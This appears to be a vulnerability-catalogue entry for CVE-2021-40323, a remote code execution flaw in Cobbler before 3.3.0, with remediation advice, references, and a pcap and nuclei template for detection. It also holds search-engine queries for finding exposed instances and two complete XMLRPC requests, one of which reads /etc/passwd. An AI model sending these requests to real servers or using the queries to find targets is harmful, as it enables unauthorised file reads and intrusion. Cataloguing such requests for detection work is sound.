---
layout: post
cve_id: CVE-2021-40323
title: Cobbler <3.3.0 - Remote Code Execution
pcap: true
pcap_path: /pcaps/2021/CVE-2021-40323.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2021/CVE-2021-40323.yaml
snort2_rule: N/A
snort3_rule: N/A
author: c-sh0
severity: critical
impact: 'Successful exploitation of this vulnerability can lead to unauthorized remote
  code execution, potentially resulting in complete compromise of the affected system.

  '
remediation: 'Upgrade Cobbler to version 3.3.0 or later, which includes a fix for
  this vulnerability.

  '
reference:
- https://github.com/cobbler/cobbler/releases/tag/v3.3.0
- https://github.com/cobbler/cobbler/issues/2795
- https://tnpitsecurity.com/blog/cobbler-multiple-vulnerabilities/
- https://nvd.nist.gov/vuln/detail/CVE-2021-40323
- https://github.com/cobbler/cobbler/commit/d8f60bbf14a838c8c8a1dba98086b223e35fe70a
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2021-40323
  cwe-id: CWE-94
  epss-score: 0.93171
  epss-percentile: 0.9978
  cpe: cpe:2.3:a:cobbler_project:cobbler:*:*:*:*:*:*:*:*
metadata:
  max-request: 2
  vendor: cobbler_project
  product: cobbler
  shodan-query: http.title:"cobbler web interface"
  fofa-query: title="cobbler web interface"
  google-query: intitle:"cobbler web interface"
tags:
- cve
- cve2021
- cobbler
- rce
- cobbler_project
- vuln
---

## ðŸ” Vulnerability Description
Cobbler before 3.3.0 allows log poisoning and resultant remote code execution via an XMLRPC method.

## ðŸŒ HTTP Request
```nohighlight
POST /cobbler_api HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
Connection: close
Content-Length: 360
Content-Type: text/xml
Accept-Encoding: gzip

<?xml version='1.0'?>
<methodCall>
  <methodName>find_profile</methodName>
  <params>
    <param>
      <value>
        <struct>
          <member>
            <name>name</name>
            <value>
              <string>*</string>
            </value>
          </member>
        </struct>
      </value>
    </param>
  </params>
</methodCall>
```

```nohighlight
POST /cobbler_api HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (CentOS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Connection: close
Content-Length: 391
Content-Type: text/xml
Accept-Encoding: gzip

<?xml version='1.0'?>
<methodCall>
  <methodName>generate_script</methodName>
  <params>
    <param>
      <value>
        <string>DXScgo</string>
      </value>
    </param>
    <param>
      <value>
        <string></string>
      </value>
    </param>
    <param>
      <value>
        <string>/etc/passwd</string>
      </value>
    </param>
  </params>
</methodCall>
```

